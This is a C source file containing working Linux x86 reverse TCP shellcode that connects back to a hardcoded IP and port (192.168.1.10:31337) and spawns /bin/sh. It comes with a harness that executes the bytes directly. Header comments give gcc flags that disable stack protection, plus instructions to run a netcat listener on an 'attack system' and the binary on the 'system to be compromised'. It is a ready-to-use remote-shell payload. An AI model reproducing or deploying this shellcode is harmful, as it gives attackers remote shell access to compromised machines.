/*
Build the code:
---------------
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
The options for gcc are to disable stack protection and enable stack execution 
respectively. Without these options the code will cause a segfault.

Test using two systems (virtual or otherwise):
----------------------------------------------
Open a terminal on the attack system,
$ nc -l -v 31337
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
$ ./reversetcpbindshell
on the attack system a connection message should now appear, shell access is now 
available on the compromised system. Try typing in some commands to prove this 
is the case.
*/

#include <stdio.h>
 
/*
 ipaddr 192.168.1.10 (c0a8010a)
 port 31337 (7a69)
*/
#define IPADDR "\xc0\xa8\x01\x0a"
#define PORT "\x7a\x69"
 
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
"\x01\x6a\x02\x89\xe1\xcd\x80\x89"
"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
IPADDR"\x66\x68"PORT"\x66\x53\xfe"
"\xc3\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
"\xc0\x52\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
"\x80";
 
main()
{
    printf("Shellcode Length: %dn", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
